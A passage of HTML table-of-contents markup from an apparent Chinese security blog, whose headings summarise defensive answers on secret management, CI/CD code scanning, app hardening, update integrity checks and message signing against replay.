href="#%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD%EF%BC%9A-%E9%99%90%E5%88%B6-IPv6-%E8%AE%BF%E9%97%AE%E8%8C%83%E5%9B%B4%EF%BC%8C%E4%BD%BF%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99%E8%A7%84%E5%88%99%E6%8B%A6%E6%88%AA%E5%A4%96%E9%83%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E6%B5%81%E9%87%8F%E3%80%82-%E5%90%AF%E7%94%A8-RA-Guard%EF%BC%8C%E9%98%B2%E6%AD%A2%E6%81%B6%E6%84%8F-IPv6-%E8%B7%AF%E7%94%B1%E5%85%AC%E5%91%8A%E3%80%82"><span class="toc-number">48.</span> <span class="toc-text">防范措施：- 限制 IPv6 访问范围，使用防火墙规则拦截外部未授权流量。- 启用 RA-Guard，防止恶意 IPv6 路由公告。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89%E6%96%B9%E5%BC%95%E5%85%A5%E7%9A%84%E5%BA%94%E7%94%A8%E5%92%8C%E8%87%AA%E7%A0%94%E5%BA%94%E7%94%A8%E8%AF%84%E4%BC%B0%E7%9A%84%E5%B7%AE%E5%BC%82%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%9F"><span class="toc-number">48.0.1.</span> <span class="toc-text">三方引入的应用和自研应用评估的差异有哪些？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E7%A0%94%E5%BA%94%E7%94%A8%E8%AF%84%E4%BC%B0%EF%BC%9A-%E9%87%8D%E7%82%B9%E5%85%B3%E6%B3%A8-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%A6%82%E6%94%AF%E4%BB%98%E7%BB%95%E8%BF%87%E3%80%81%E6%9D%83%E9%99%90%E8%B6%8A%E6%9D%83%EF%BC%89%E3%80%82-%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8%E8%A7%84%E8%8C%83%E9%9C%80%E4%B8%A5%E6%A0%BC%E6%89%A7%E8%A1%8C%EF%BC%8C%E9%98%B2%E6%AD%A2%E5%86%85%E9%83%A8%E6%B3%84%E9%9C%B2%E9%A3%8E%E9%99%A9%E3%80%82"><span class="toc-number">49.</span> <span class="toc-text">自研应用评估：- 重点关注 业务逻辑漏洞（如支付绕过、权限越权）。- 代码安全规范需严格执行，防止内部泄露风险。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%87%91%E8%9E%8D%E4%B8%9A%E5%8A%A1%E6%9C%89%E4%BD%95%E7%89%B9%E6%80%A7%EF%BC%9F"><span class="toc-number">49.0.1.</span> <span class="toc-text">金融业务有何特性？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mvn-%E6%BA%90%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E9%9C%80%E8%A6%81%E8%80%83%E8%99%91%E5%93%AA%E4%BA%9B%E7%82%B9%EF%BC%9F"><span class="toc-number">49.0.2.</span> <span class="toc-text">mvn 源的安全性需要考虑哪些点？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%AE%A9%E4%B8%9A%E5%8A%A1%E6%96%B9%E4%B8%BB%E5%8A%A8%E6%89%BE%E4%BD%A0%E8%AF%84%E4%BC%B0%EF%BC%9F"><span class="toc-number">49.0.3.</span> <span class="toc-text">如何让业务方主动找你评估？</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E8%AF%84%E4%BC%B0%E8%A6%86%E7%9B%96%E8%8C%83%E5%9B%B4%E7%9A%84%E4%BC%98%E5%85%88%E7%BA%A7%EF%BC%9F"><span class="toc-number">49.1.</span> <span class="toc-text">如何判断评估覆盖范围的优先级？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5%EF%BC%9A-%E9%87%87%E7%94%A8-%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90%EF%BC%88Attack-Surface-Analysis%EF%BC%89-%E8%AF%86%E5%88%AB%E9%AB%98%E9%A3%8E%E9%99%A9%E5%8C%BA%E5%9F%9F%E3%80%82-%E7%BB%93%E5%90%88-%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1-%E8%AF%84%E4%BC%B0%E6%BD%9C%E5%9C%A8%E5%A8%81%E8%83%81%E3%80%82"><span class="toc-number">50.</span> <span class="toc-text">最佳实践：- 采用 攻击面分析（Attack Surface Analysis） 识别高风险区域。- 结合 威胁建模 评估潜在威胁。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%B3%BB%E7%BB%9F%E6%8F%90%E9%AB%98%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0%E6%95%88%E7%8E%87%EF%BC%9F"><span class="toc-number">50.1.</span> <span class="toc-text">如何系统提高安全评估效率？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%EF%BC%9A-%E5%9C%A8-CI-CD-%E6%B5%81%E7%A8%8B%E4%B8%AD%E9%9B%86%E6%88%90-SonarQube-%E8%BF%9B%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8%E6%89%AB%E6%8F%8F%E3%80%82%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%EF%BC%88CI%EF%BC%89%E5%92%8C%E6%8C%81%E7%BB%AD%E9%83%A8%E7%BD%B2%EF%BC%88CD%EF%BC%89%E6%B5%81%E7%A8%8B-%E9%87%87%E7%94%A8-Burp-Suite-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%89%AB%E6%8F%8F-%E5%8F%91%E7%8E%B0-Web-%E6%BC%8F%E6%B4%9E%E3%80%82"><span class="toc-number">51.</span> <span class="toc-text">示例：- 在 CI&#x2F;CD 流程中集成 SonarQube 进行代码安全扫描。持续集成（CI）和持续部署（CD）流程- 采用 Burp Suite 自动化扫描 发现 Web 漏洞。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3%E5%AE%89%E5%85%A8%E5%B7%A6%E7%A7%BB%EF%BC%9F"><span class="toc-number">51.1.</span> <span class="toc-text">如何理解安全左移？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%EF%BC%9A-%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%8F%90%E4%BA%A4%E6%97%B6%E8%BF%90%E8%A1%8C-Checkmarx-%E8%BF%9B%E8%A1%8C%E9%9D%99%E6%80%81%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E3%80%82-%E5%9C%A8-Jenkins-Pipeline-%E4%B8%AD%E5%8A%A0%E5%85%A5-OWASP-ZAP-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%89%AB%E6%8F%8F%E3%80%82"><span class="toc-number">52.</span> <span class="toc-text">示例：- 在代码提交时运行 Checkmarx 进行静态代码分析。- 在 Jenkins Pipeline 中加入 OWASP ZAP 自动化扫描。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0%E7%9A%84%E8%A1%8C%E4%B8%9A%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">52.1.</span> <span class="toc-text">安全评估的行业最佳实践是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AC%E7%BC%96%E7%A0%81%E5%AF%86%E9%92%A5%E6%9C%89%E4%BD%95%E9%A3%8E%E9%99%A9%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%86%B3%EF%BC%9F"><span class="toc-number">52.2.</span> <span class="toc-text">硬编码密钥有何风险以及如何系统解决？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%EF%BC%9A-%E4%BD%BF%E7%94%A8%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AD%98%E5%82%A8%E5%AF%86%E9%92%A5%EF%BC%9A-%E4%BD%BF%E7%94%A8%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%EF%BC%88KMS%EF%BC%89%EF%BC%9A-%E9%87%87%E7%94%A8-AWS-KMS%E3%80%81HashiCorp-Vault-%E8%BF%9B%E8%A1%8C%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86%EF%BC%8C%E9%81%BF%E5%85%8D%E7%A1%AC%E7%BC%96%E7%A0%81%E3%80%82-%E5%AE%9A%E6%9C%9F%E8%BD%AE%E6%8D%A2%E5%AF%86%E9%92%A5%EF%BC%9A-%E8%AE%BE%E5%AE%9A%E5%AF%86%E9%92%A5-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%EF%BC%8C%E5%AE%9A%E6%9C%9F%E7%94%9F%E6%88%90%E6%96%B0%E5%AF%86%E9%92%A5%EF%BC%8C%E9%99%8D%E4%BD%8E%E9%95%BF%E6%9C%9F%E6%B3%84%E9%9C%B2%E9%A3%8E%E9%99%A9%E3%80%82"><span class="toc-number">53.</span> <span class="toc-text">解决方案：- 使用环境变量存储密钥：  1export API_KEY&#x3D;&quot;your-secret-key&quot;- 使用密钥管理系统（KMS）：  - 采用 AWS KMS、HashiCorp Vault 进行密钥管理，避免硬编码。- 定期轮换密钥：  - 设定密钥 生命周期，定期生成新密钥，降低长期泄露风险。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0day-%E6%BC%8F%E6%B4%9E%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1%EF%BC%9F"><span class="toc-number">53.1.</span> <span class="toc-text">0day 漏洞如何防御？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E7%AD%96%E7%95%A5%EF%BC%9A1-%E5%A2%9E%E5%BC%BA%E6%94%BB%E5%87%BB%E9%9D%A2%E7%9B%91%E6%8E%A7%EF%BC%9A-%E9%87%87%E7%94%A8-%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%EF%BC%88Threat-Intelligence%EF%BC%89%EF%BC%8C%E8%AE%A2%E9%98%85-CVE-%E9%A2%84%E8%AD%A6%E4%BF%A1%E6%81%AF%E3%80%822-%E5%90%AF%E7%94%A8-RASP%EF%BC%88%E8%BF%90%E8%A1%8C%E6%97%B6%E5%BA%94%E7%94%A8%E8%87%AA%E6%88%91%E4%BF%9D%E6%8A%A4%EF%BC%89%EF%BC%9A-%E9%80%9A%E8%BF%87-Hook-%E5%85%B3%E9%94%AE-API%EF%BC%8C%E6%A3%80%E6%B5%8B%E5%BC%82%E5%B8%B8%E8%A1%8C%E4%B8%BA%EF%BC%8C%E5%A6%82-Java-RASP-%E7%9B%91%E6%8E%A7-Runtime-exec-%E3%80%823-%E5%8A%A0%E5%BC%BA%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%EF%BC%9A-%E9%99%90%E5%88%B6%E9%AB%98%E6%9D%83%E9%99%90%E7%94%A8%E6%88%B7%E6%93%8D%E4%BD%9C%EF%BC%8C%E5%A6%82-SSH-%E8%AE%BF%E9%97%AE%E3%80%81%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E6%9D%83%E9%99%90%E3%80%82"><span class="toc-number">54.</span> <span class="toc-text">防御策略：1. 增强攻击面监控：   - 采用 威胁情报（Threat Intelligence），订阅 CVE 预警信息。2. 启用 RASP（运行时应用自我保护）：   - 通过 Hook 关键 API，检测异常行为，如 Java RASP 监控 Runtime.exec()。3. 加强访问控制：   - 限制高权限用户操作，如 SSH 访问、数据库管理权限。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#GitHub-%E7%AD%89%E4%B8%89%E6%96%B9%E6%B3%84%E6%BC%8F%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E5%A6%82%E4%BD%95%E4%BD%93%E7%B3%BB%E9%98%B2%E5%BE%A1%EF%BC%9F"><span class="toc-number">54.0.1.</span> <span class="toc-text">GitHub 等三方泄漏敏感信息如何体系防御？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95%EF%BC%9A1-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%89%AB%E6%8F%8F%EF%BC%9A-%E4%BD%BF%E7%94%A8-GitLeaks%E3%80%81TruffleHog-%E5%AE%9A%E6%9C%9F%E6%89%AB%E6%8F%8F-Git-%E4%BB%93%E5%BA%93%E3%80%822-%E5%BC%BA%E5%88%B6-Git-Hook-%E6%A3%80%E6%9F%A5%EF%BC%9A-%E5%9C%A8-Git-%E6%8F%90%E4%BA%A4%E5%89%8D%E6%A3%80%E6%B5%8B%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%EF%BC%8C%E9%98%B2%E6%AD%A2%E8%AF%AF%E6%8F%90%E4%BA%A4%EF%BC%9A-3-%E5%AF%86%E9%92%A5%E5%A4%B1%E6%95%88%E6%9C%BA%E5%88%B6%EF%BC%9A-%E4%B8%80%E6%97%A6%E5%AF%86%E9%92%A5%E6%B3%84%E9%9C%B2%EF%BC%8C%E7%AB%8B%E5%8D%B3%E4%BD%BF%E5%85%B6%E5%A4%B1%E6%95%88%E5%B9%B6%E9%87%8D%E6%96%B0%E7%94%9F%E6%88%90%E3%80%82"><span class="toc-number">55.</span> <span class="toc-text">防御方法：1. 自动化扫描：   - 使用 GitLeaks、TruffleHog 定期扫描 Git 仓库。2. 强制 Git Hook 检查：   - 在 Git 提交前检测敏感信息，防止误提交：     1pre-commit run --all-files3. 密钥失效机制：   - 一旦密钥泄露，立即使其失效并重新生成。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87%E6%8A%80%E6%9C%AF%E6%89%8B%E6%AE%B5%E6%8C%96%E6%8E%98%E4%B8%8E%E5%BC%A5%E8%A1%A5%EF%BC%9F"><span class="toc-number">55.1.</span> <span class="toc-text">业务逻辑漏洞如何通过技术手段挖掘与弥补？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E7%AD%96%E7%95%A5%EF%BC%9A-%E5%90%8E%E7%AB%AF%E5%BC%BA%E5%88%B6%E6%9D%83%E9%99%90%E6%A0%A1%E9%AA%8C%EF%BC%8C%E9%81%BF%E5%85%8D%E4%BB%85%E4%BE%9D%E8%B5%96%E5%89%8D%E7%AB%AF%E9%99%90%E5%88%B6%E3%80%82-%E5%90%AF%E7%94%A8%E5%B9%82%E7%AD%89%E6%80%A7%E6%A3%80%E6%9F%A5%EF%BC%8C%E9%98%B2%E6%AD%A2%E5%85%B3%E9%94%AE%E4%BA%A4%E6%98%93%E8%A2%AB%E9%87%8D%E5%A4%8D%E6%89%A7%E8%A1%8C%E3%80%82"><span class="toc-number">56.</span> <span class="toc-text">修复策略：- 后端强制权限校验，避免仅依赖前端限制。- 启用幂等性检查，防止关键交易被重复执行。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BD%AF%E4%BB%B6%E4%BE%9B%E5%BA%94%E9%93%BE%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E5%A6%82%E4%BD%95%E7%B3%BB%E7%BB%9F%E8%A7%84%E9%81%BF%EF%BC%9F"><span class="toc-number">56.1.</span> <span class="toc-text">软件供应链后门漏洞如何系统规避？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%EF%BC%9A%E4%BD%BF%E7%94%A8-Snyk-%E6%89%AB%E6%8F%8F-Node-js-%E4%BE%9D%E8%B5%96%EF%BC%9A"><span class="toc-number">57.</span> <span class="toc-text">示例：使用 Snyk 扫描 Node.js 依赖：1snyk test</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%AB%AF-JavaScript-%E4%BB%A3%E7%A0%81%E5%A6%82%E4%BD%95%E6%B7%B7%E6%B7%86%E4%BB%A5%E5%8F%8A%E5%8F%8D%E8%B0%83%E8%AF%95%EF%BC%9F"><span class="toc-number">57.1.</span> <span class="toc-text">前端 JavaScript 代码如何混淆以及反调试？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF%EF%BC%9A1-%E7%A6%81%E7%94%A8%E5%BC%80%E5%8F%91%E8%80%85%E5%B7%A5%E5%85%B7%EF%BC%9A-%E7%9B%91%E5%90%AC-DevTools-%E6%89%93%E5%BC%80%E7%8A%B6%E6%80%81%EF%BC%8C%E8%A7%A6%E5%8F%91-debugger%EF%BC%9A-2-%E6%8B%A6%E6%88%AA-console-%E8%B0%83%E8%AF%95%EF%BC%9A-%E7%A6%81%E7%94%A8-console-%EF%BC%9A-3-%E4%BB%A3%E7%A0%81%E8%87%AA%E6%AF%81%E6%9C%BA%E5%88%B6%EF%BC%9A-%E5%BD%93%E4%BB%A3%E7%A0%81%E6%A3%80%E6%B5%8B%E5%88%B0-DevTools-%E8%BF%90%E8%A1%8C%E6%97%B6%EF%BC%8C%E4%BF%AE%E6%94%B9%E5%85%B3%E9%94%AE%E5%8F%98%E9%87%8F%E6%88%96%E7%BB%88%E6%AD%A2%E6%89%A7%E8%A1%8C%EF%BC%9A"><span class="toc-number">58.</span> <span class="toc-text">反调试技术：1. 禁用开发者工具：   - 监听 DevTools 打开状态，触发 debugger：     123456setInterval(() &#x3D;&gt; {    console.log(&quot;Checking DevTools...&quot;);    if (window.outerHeight - window.innerHeight &gt; 200) {        window.location.reload();    }}, 1000);2. 拦截 console 调试：   - 禁用 console.*：     1console.log &#x3D; function() {};3. 代码自毁机制：   - 当代码检测到 DevTools 运行时，修改关键变量或终止执行：     123if (window.navigator.webdriver) {    document.write(&quot;Debugger detected!&quot;);}</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E5%BD%93%E5%89%8D%E9%A1%B5%E9%9D%A2-location-href-%E6%94%B9%E5%8F%98%E5%90%8E%EF%BC%8C%E4%BB%8D%E7%84%B6%E8%83%BD%E6%89%A7%E8%A1%8C%E4%B9%8B%E5%89%8D%E7%9A%84-JavaScript%EF%BC%9F"><span class="toc-number">58.1.</span> <span class="toc-text">如何实现当前页面 location.href 改变后，仍然能执行之前的 JavaScript？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%EF%BC%9A1-%E4%BD%BF%E7%94%A8-setTimeout-%E6%89%A7%E8%A1%8C%E5%BB%B6%E8%BF%9F%E4%BB%BB%E5%8A%A1%EF%BC%9A-JavaScript-%E7%9A%84-setTimeout-%E6%96%B9%E6%B3%95%E4%B8%8D%E4%BC%9A%E8%A2%AB-location-href-%E5%BD%B1%E5%93%8D%EF%BC%8C%E5%8F%AF%E7%94%A8%E4%BA%8E%E5%BB%B6%E8%BF%9F%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%EF%BC%9A-2-%E4%BD%BF%E7%94%A8-window-onbeforeunload-%E7%9B%91%E5%90%AC%E8%B7%B3%E8%BD%AC%EF%BC%9A-%E5%9C%A8%E9%A1%B5%E9%9D%A2%E8%B7%B3%E8%BD%AC%E5%89%8D%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%EF%BC%9A-3-Service-Worker-%E6%96%B9%E5%BC%8F%EF%BC%9A-%E9%80%9A%E8%BF%87-Service-Worker-%E6%8C%81%E7%BB%AD%E8%BF%90%E8%A1%8C-JS-%E9%80%BB%E8%BE%91%EF%BC%8C%E5%8D%B3%E4%BD%BF%E9%A1%B5%E9%9D%A2%E8%B7%B3%E8%BD%AC%EF%BC%9A"><span class="toc-number">59.</span> <span class="toc-text">方法：1. 使用 setTimeout 执行延迟任务：   - JavaScript 的 setTimeout 方法不会被 location.href 影响，可用于延迟执行代码：     1234setTimeout(() &#x3D;&gt; {    alert(&quot;This runs even after page change!&quot;);}, 3000);location.href &#x3D; &quot;https:&#x2F;&#x2F;example.com&quot;;2. 使用 window.onbeforeunload 监听跳转：   - 在页面跳转前执行代码：     1234window.onbeforeunload &#x3D; function() {    console.log(&quot;Page is leaving...&quot;);    return &quot;Are you sure?&quot;;};3. Service Worker 方式：   - 通过 Service Worker 持续运行 JS 逻辑，即使页面跳转：     123navigator.serviceWorker.register(&#39;&#x2F;worker.js&#39;).then(() &#x3D;&gt; {    console.log(&quot;Service Worker Registered!&quot;);});</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#APK-%E5%8F%8D%E7%BC%96%E8%AF%91%E6%9C%89%E5%93%AA%E5%87%A0%E7%A7%8D%E8%B7%AF%E5%BE%84%EF%BC%8C%E4%BB%A3%E8%A1%A8%E5%B7%A5%E5%85%B7%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%9F"><span class="toc-number">59.1.</span> <span class="toc-text">APK 反编译有哪几种路径，代表工具有哪些？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD%EF%BC%9A-%E5%BC%80%E5%90%AF-ProGuard-%E8%BF%9B%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%EF%BC%9A-%E4%BD%BF%E7%94%A8-Native-C-%E4%BB%A3%E7%A0%81%E4%BF%9D%E6%8A%A4%E5%85%B3%E9%94%AE%E9%80%BB%E8%BE%91%EF%BC%8C%E9%81%BF%E5%85%8D-Java-%E5%B1%82%E8%A2%AB%E8%BD%BB%E6%98%93%E5%8F%8D%E7%BC%96%E8%AF%91%E3%80%82"><span class="toc-number">60.</span> <span class="toc-text">防御措施：- 开启 ProGuard 进行代码混淆：  12minifyEnabled trueproguardFiles getDefaultProguardFile(&#39;proguard-android-optimize.txt&#39;), &#39;proguard-rules.pro&#39;- 使用 Native C++ 代码保护关键逻辑，避免 Java 层被轻易反编译。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#App-%E8%87%AA%E6%A3%80%E5%8D%87%E7%BA%A7%E5%9C%BA%E6%99%AF%E4%B8%8B%E4%BC%9A%E5%AD%98%E5%9C%A8%E5%93%AA%E4%BA%9B%E9%A3%8E%E9%99%A9%EF%BC%9F"><span class="toc-number">60.1.</span> <span class="toc-text">App 自检升级场景下会存在哪些风险？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD%EF%BC%9A-%E5%BC%BA%E5%88%B6%E4%BD%BF%E7%94%A8-HTTPS-%E8%BF%9B%E8%A1%8C%E6%9B%B4%E6%96%B0%E5%8C%85%E4%BC%A0%E8%BE%93%EF%BC%8C%E9%98%B2%E6%AD%A2%E6%B5%81%E9%87%8F%E7%AF%A1%E6%94%B9%E3%80%82-%E7%AD%BE%E5%90%8D%E6%A0%A1%E9%AA%8C%EF%BC%8C%E6%9B%B4%E6%96%B0%E5%8C%85%E9%9C%80%E8%BF%9B%E8%A1%8C-SHA256-%E6%A0%A1%E9%AA%8C%EF%BC%9A-%E5%AE%8C%E6%95%B4%E6%80%A7%E6%A3%80%E6%9F%A5%EF%BC%8C%E6%A0%A1%E9%AA%8C-AndroidManifest-xml-%E5%8F%8A-dex%EF%BC%8C%E9%98%B2%E6%AD%A2%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E3%80%82"><span class="toc-number">61.</span> <span class="toc-text">防护措施：- 强制使用 HTTPS 进行更新包传输，防止流量篡改。- 签名校验，更新包需进行 SHA256 校验：  12MessageDigest md &#x3D; MessageDigest.getInstance(&quot;SHA-256&quot;);byte[] digest &#x3D; md.digest(fileBytes);- 完整性检查，校验 AndroidManifest.xml 及 dex，防止动态加载恶意代码。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1%E4%B8%80%E5%A5%97%E9%80%9A%E4%BF%A1%E6%9C%BA%E5%88%B6%EF%BC%8C%E8%83%BD%E5%A4%9F%E4%BF%9D%E8%AF%81%E4%BC%A0%E8%BE%93%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E5%AE%8C%E6%95%B4%E6%80%A7%E3%80%81%E4%B8%8D%E5%8F%AF%E6%8A%B5%E8%B5%96%E6%80%A7%E4%BB%A5%E5%8F%8A%E9%98%B2%E6%AD%A2%E9%87%8D%E6%94%BE%EF%BC%9F"><span class="toc-number">61.1.</span> <span class="toc-text">如何设计一套通信机制，能够保证传输过程中的完整性、不可抵赖性以及防止重放？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%99%EF%BC%9A1-%E5%AE%8C%E6%95%B4%E6%80%A7%EF%BC%9A-%E9%87%87%E7%94%A8-HMAC-SHA256-%E7%AD%BE%E5%90%8D%EF%BC%8C%E7%A1%AE%E4%BF%9D%E6%B6%88%E6%81%AF%E6%9C%AA%E8%A2%AB%E7%AF%A1%E6%94%B9%EF%BC%9A-2-%E4%B8%8D%E5%8F%AF%E6%8A%B5%E8%B5%96%E6%80%A7%EF%BC%9A-%E4%BD%BF%E7%94%A8-RSA-%E7%AD%BE%E5%90%8D-%E7%A1%AE%E4%BF%9D%E6%B6%88%E6%81%AF%E6%9D%A5%E6%BA%90%E5%8F%AF%E4%BF%A1%EF%BC%9A-3-%E9%98%B2%E6%AD%A2%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB%EF%BC%9A-%E9%87%87%E7%94%A8-%E6%97%B6%E9%97%B4%E6%88%B3-%E9%9A%8F%E6%9C%BA%E6%95%B0%EF%BC%88nonce%EF%BC%89%EF%BC%8C%E7%A1%AE%E4%BF%9D%E6%AF%8F%E6%AC%A1%E8%AF%B7%E6%B1%82%E5%94%AF%E4%B8%80%EF%BC%9A-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E5%AD%98%E5%82%A8-nonce%EF%BC%8C%E9%81%BF%E5%85%8D%E7%9B%B8%E5%90%8C%E8%AF%B7%E6%B1%82%E9%87%8D%E5%A4%8D%E6%8F%90%E4%BA%A4%E3%80%82"><span class="toc-number">62.</span> <span class="toc-text">设计原则：1. 完整性：   - 采用 HMAC-SHA256 签名，确保消息未被篡改：     123Mac mac &#x3D; Mac.getInstance(&quot;HmacSHA256&quot;);mac.init(new SecretKeySpec(secretKey.getBytes(), &quot;HmacSHA256&quot;));byte[] hash &#x3D; mac.doFinal(message.getBytes());2. 不可抵赖性：   - 使用 RSA 签名 确保消息来源可信：     1234Signature sign &#x3D; Signature.getInstance(&quot;SHA256withRSA&quot;);sign.initSign(privateKey);sign.update(message.getBytes());byte[] signature &#x3D; sign.sign();3. 防止重放攻击：   - 采用 时间戳 + 随机数（nonce），确保每次请求唯一：     12345{  &quot;timestamp&quot;: 1700000000,  &quot;nonce&quot;: &quot;random-uuid&quot;,  &quot;signature&quot;: &quot;hmac_signature&quot;}   - 服务器端存储 nonce，避免相同请求重复提交。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E5%AE%9E%E4%BD%93%E6%A3%80%E6%B5%8B%EF%BC%9F"><span class="toc-number">62.1.</span> <span class="toc-text">如何进行实体检测？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E6%8E%AA%E6%96%BD%EF%BC%9A-%E9%81%BF%E5%85%8D%E4%BE%9D%E8%B5%96-%E5%8D%95%E4%B8%80%E6%A0%87%E8%AF%86%E7%AC%A6%EF%BC%8C%E7%BB%BC%E5%90%88%E5%A4%9A%E4%B8%AA%E6%95%B0%E6%8D%AE%E6%BA%90%E8%BF%9B%E8%A1%8C%E9%AA%8C%E8%AF%81%E3%80%82-%E9%87%87%E7%94%A8-%E7%94%9F%E7%89%A9%E8%AF%86%E5%88%AB%EF%BC%88%E6%8C%87%E7%BA%B9%E3%80%81%E4%BA%BA%E8%84%B8%EF%BC%89%E5%A2%9E%E5%BC%BA%E8%AE%A4%E8%AF%81%E5%AE%89%E5%85%A8%E6%80%A7%E3%80%82"><span class="toc-number">63.</span> <span class="toc-text">安全措施：- 避免依赖 单一标识符，综合多个数据源进行验证。- 采用 生物识别（指纹、人脸）增强认证安全性。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" 